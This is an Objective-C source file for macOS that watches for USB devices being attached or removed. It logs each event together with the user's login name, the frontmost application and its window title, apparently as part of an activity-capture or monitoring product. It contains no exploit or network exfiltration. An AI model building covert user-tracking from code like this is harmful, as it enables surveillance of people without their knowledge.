//
//  USBDetection.m
//  USBConnectionCaptureManager
//
//  Created by ophat on 2/4/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "USBDetection.h"

#import "DateTimeFormat.h"
#import "FxUSBConnectionEvent.h"
#import "SystemUtilsImpl.h"

#import <objc/runtime.h>

static USBDetection *_USBDectector  = nil;
static IONotificationPortRef gNotifyPort = nil;

@interface USBDetection (private)
- (void) threadMethod;
@end

@implementation USBDetection

@synthesize mAddedIter,mRunLoop,mRunLoopSource;
@synthesize mDelegate, mSelector, mThreadA;

typedef struct MyPrivateData {
    io_object_t				notification;
    IOUSBDeviceInterface	**deviceInterface;
    CFStringRef				deviceName;
} MyPrivateData;


void DeviceRemove(void *refCon, io_service_t service, natural_t messageType, void *messageArgument)
{
    kern_return_t	kr;
    MyPrivateData	*privateDataRef = (MyPrivateData *) refCon;
    
    if (messageType == kIOMessageServiceIsTerminated) {

        // Dump our private data to stderr just to see what it looks like.
        DLog(@"Device : %@ is removed",privateDataRef->deviceName);
        
        id delegate = [_USBDectector mDelegate];
        SEL selector = [_USBDectector mSelector];
        if ([delegate respondsToSelector:selector]) {

            CFTypeRef wr = IORegistryEntrySearchCFProperty(service, kIOServicePlane, CFSTR(kIOMediaWritableKey), kCFAllocatorDefault, kIORegistryIterateRecursively);
            BOOL isWritable =  (__bridge BOOL )wr;
            if (isWritable) {
                DLog(@"isWritable");
            }

            FxUSBConnectionEvent *usbEvent = [[FxUSBConnectionEvent alloc] init];
            [usbEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [usbEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
            [usbEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
            [usbEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
            [usbEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
            [usbEvent setMAction:kUSBConnectionActionDisconnected];
            if (isWritable) {
                [usbEvent setMDeviceType:kUSBConnectionTypeMassStorage];
            } else {
                [usbEvent setMDeviceType:kUSBConnectionTypePortDevice];
            }
            [usbEvent setMDriveName:[[(NSString *)(privateDataRef->deviceName) copy] autorelease]];
            
            [delegate performSelector:selector onThread:[_USBDectector mThreadA] withObject:usbEvent waitUntilDone:NO];
            
            [usbEvent release];
        }
        
        // Free the data we're no longer using now that the device is going away
        CFRelease(privateDataRef->deviceName);
        
        if (privateDataRef->deviceInterface) {
            kr = (*privateDataRef->deviceInterface)->Release(privateDataRef->deviceInterface);
        }
        
        kr = IOObjectRelease(privateDataRef->notification);
        
        free(privateDataRef);
    }
}

void DeviceAdded(void *refCon, io_iterator_t iterator)
{
    
    sleep(3);
    
    kern_return_t		kr;
    io_service_t		usbDevice;
    
    while ((usbDevice = IOIteratorNext(iterator))) {
        io_name_t		deviceName;
        CFStringRef		deviceNameAsCFString = NULL;
        MyPrivateData	*privateDataRef = NULL;
        
        // Add some app-specific information about this device.
        // Create a buffer to hold the data.
        privateDataRef = malloc(sizeof(MyPrivateData));
        bzero(privateDataRef, sizeof(MyPrivateData));
        
        // Get the USB device's name.
        kr = IORegistryEntryGetName(usbDevice, deviceName);
        if (KERN_SUCCESS != kr) {
            deviceName[0] = '\0';
        }
        
        deviceNameAsCFString = CFStringCreateWithCString(kCFAllocatorDefault, deviceName, kCFStringEncodingASCII);
        NSString * deviceNameAsString = (__bridge NSString *)deviceNameAsCFString;
        // Save the device's name to our private data.
        privateDataRef->deviceName = deviceNameAsCFString;
        
        DLog(@"DeviceName : %@ is Attached ",deviceNameAsString);

        CFTypeRef wr = IORegistryEntrySearchCFProperty(usbDevice, kIOServicePlane, CFSTR(kIOMediaWritableKey), kCFAllocatorDefault, kIORegistryIterateRecursively);
        BOOL isWritable =  (__bridge BOOL )wr;
        if (isWritable) {
            DLog(@"isWritable");
        }
        
        Class $USBDetection = objc_getClass("USBDetection");
        id delegate = [_USBDectector mDelegate];
        SEL selector = [_USBDectector mSelector];
        if (![(USBDetection *)refCon isKindOfClass:$USBDetection] &&
            [delegate respondsToSelector:selector]) {
            FxUSBConnectionEvent *usbEvent = [[FxUSBConnectionEvent alloc] init];
            [usbEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [usbEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
            [usbEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
            [usbEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
            [usbEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
            [usbEvent setMAction:kUSBConnectionActionConnected];
            if (isWritable) {
                [usbEvent setMDeviceType:kUSBConnectionTypeMassStorage];
            } else {
                [usbEvent setMDeviceType:kUSBConnectionTypePortDevice];
            }
            [usbEvent setMDriveName:[[deviceNameAsString copy] autorelease]];
            
            [delegate performSelector:selector
                             onThread:[_USBDectector mThreadA]
                           withObject:usbEvent
                        waitUntilDone:NO];
            
            [usbEvent release];
        }
        
        // For remove
        kr = IOServiceAddInterestNotification(gNotifyPort,						// notifyPort
                                              usbDevice,						// service
                                              kIOGeneralInterest,				// interestType
                                              DeviceRemove,                     // callback
                                              privateDataRef,					// refCon
                                              &(privateDataRef->notification)	// notification
                                              );
        
        if (KERN_SUCCESS != kr) {
            DLog(@"IOServiceAddInterestNotification returned 0x%08x.\n", kr);
        }
        
        // Done with this USB device; release the reference added by IOIteratorNext
        kr = IOObjectRelease(usbDevice);
    }
}

void USB_SignalHandler(int sigraised){
    DLog(@"===============\nInterrupted.\n=================");
    //exit(0);
}

- (id) init {
    self = [super init];
    if (self) {
        mThreadA = [NSThread currentThread];
        _USBDectector = self;
    }
    return (self);
}

-(void)startCapture{
    [self stopCapture];
    
    if (!self.mRunLoop) {
        DLog(@"startCapture USBConnection");
        [NSThread detachNewThreadSelector:@selector(threadMethod) toTarget:self withObject:nil];
    }
}

-(void)stopCapture{
    if (self.mRunLoop) {
        DLog(@"stopCapture USBConnection");
        //DLog(@"self.RunLoop %@", self.mRunLoop);
        self.mRunLoopSource = IONotificationPortGetRunLoopSource(gNotifyPort);

        CFRunLoopRemoveSource(self.mRunLoop, self.mRunLoopSource, kCFRunLoopDefaultMode);
        CFRunLoopStop(self.mRunLoop);
        
        self.mRunLoopSource = nil;
        self.mRunLoop = nil;
    }
    
    if (gNotifyPort) {
        IONotificationPortDestroy(gNotifyPort);
        gNotifyPort = nil;
    }
}

- (void) threadMethod {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    @try {
        CFMutableDictionaryRef 	matchingDict;
        kern_return_t			kr;
        sig_t					oldHandler;
        
        oldHandler = signal(SIGINT, USB_SignalHandler);
        if (oldHandler == SIG_ERR) {
            DLog(@"Could not establish new signal handler.");
        }
        
        matchingDict = IOServiceMatching(kIOUSBDeviceClassName);	// Interested in instances of class
        // IOUSBDevice and its subclasses
        if (matchingDict == NULL) {
            DLog(@"IOServiceMatching returned NULL.");
        }
        
        gNotifyPort = IONotificationPortCreate(kIOMasterPortDefault);
        self.mRunLoopSource = IONotificationPortGetRunLoopSource(gNotifyPort);
        
        self.mRunLoop = CFRunLoopGetCurrent();
        //DLog(@"self.mRunLoop %@", self.mRunLoop);
        CFRunLoopAddSource(self.mRunLoop, self.mRunLoopSource, kCFRunLoopDefaultMode);
        
        // Now set up a notification to be called when a device is first matched by I/O Kit.
        kr = IOServiceAddMatchingNotification(gNotifyPort,					// notifyPort
                                              kIOFirstMatchNotification,	// notificationType
                                              matchingDict,					// matching
                                              DeviceAdded,					// callback
                                              NULL,							// refCon
                                              &mAddedIter					// notification
                                              );
        // Iterate once to get already-present devices and arm the notification
        DeviceAdded((void *)self, self.mAddedIter);
        
        // Start the run loop. Now we'll receive notifications.
        DLog(@"Start Run loop");
        CFRunLoopRun();
    }
    @catch (NSException *exception) {
        DLog(@"USB monitor thread exeception, %@", exception);
    }
    @finally {
        ;
    }
    DLog(@"USB monitor thread exit...");
    [pool release];
}

- (void) dealloc {
    _USBDectector = nil;
    [self stopCapture];
    [super dealloc];
}

@end
